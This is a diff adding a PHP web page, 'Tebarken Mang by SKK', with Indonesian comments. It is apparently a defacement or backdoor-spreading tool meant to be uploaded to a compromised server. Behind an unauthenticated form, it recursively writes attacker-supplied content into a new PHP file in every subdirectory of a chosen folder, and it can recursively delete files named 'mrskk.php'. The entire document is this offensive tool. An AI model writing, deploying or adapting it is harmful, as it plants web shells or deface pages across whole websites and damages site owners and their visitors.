@@ -1,0 +1,78 @@
+<?php
+
+echo "<title>Tebarken Mang by SKK</title>";
+echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
+echo "<style>
+    body {
+        background-color: #5C4033;
+        color: black;
+        font-family: 'Electrolize', sans-serif;
+    }
+    .container {
+        text-align: center;
+        margin-top: 50px;
+    }
+    img {
+        width: 100px;
+        height: auto;
+    }
+    input, textarea {
+        color: lime;
+        background-color: #000000;
+    }
+</style>";
+
+echo "<body><div class='container'>";
+echo "<form method='POST'>";
+echo "<img src='https://res.cloudinary.com/di1pwoapk/image/upload/v1741152887/skk_lq8ul0.png'>";
+echo "<hr color='black'><br><font color='black'>Target Folder</font><br>";
+echo "<input type='text' name='base_dir' value='".getcwd ()."'><br><br>";
+echo "<input type='submit' name='action' value='Hapus mrskk.php'>";
+echo "<input type='submit' name='action' value='Upload mrskk.php'></form></div></body>";
+
+function deleteFiles($dir, $filename) {
+    foreach (scandir($dir) as $file) {
+        if ($file == '.' || $file == '..') continue;
+        
+        $path = "$dir/$file";
+        if (is_dir($path)) {
+            deleteFiles($path, $filename); // Rekursif untuk folder
+        } elseif ($file === $filename) {
+            unlink($path); // Hapus file
+            echo "<hr color='black'>>> <font color='black'>Deleted: $path</font> <font color='lime'>(✔)</font>";
+        }
+    }
+}
+
+function uploadToAllDirs($dir, $content) {
+    foreach (scandir($dir) as $file) {
+        if ($file == '.' || $file == '..') continue;
+        
+        $path = "$dir/$file";
+        if (is_dir($path)) {
+            $filename = "$file-mrskk.php"; // Nama file berdasarkan direktori
+            if (file_put_contents($path.'/'.$filename, $content)) {
+                echo "<hr color='black'>>> <font color='black'>$path/$filename</font> <font color='lime'>(✔)</font>";
+            }
+            uploadToAllDirs($path, $content);
+        }
+    }
+}
+
+if (isset($_POST['base_dir'])) {
+    $baseDir = $_POST['base_dir'];
+    if (!file_exists($baseDir)) {
+        die("$baseDir Not Found!<br>");
+    }
+    if (!is_dir($baseDir)) {
+        die("$baseDir Is Not A Directory!<br>");
+    }
+    
+    if ($_POST['action'] === 'Hapus mrskk.php') {
+        deleteFiles($baseDir, 'mrskk.php'); // Panggil fungsi hapus
+    } elseif ($_POST['action'] === 'Upload mrskk.php') {
+        uploadToAllDirs($baseDir, $_POST['index']); // Panggil fungsi upload
+    }
+}
+
+?>
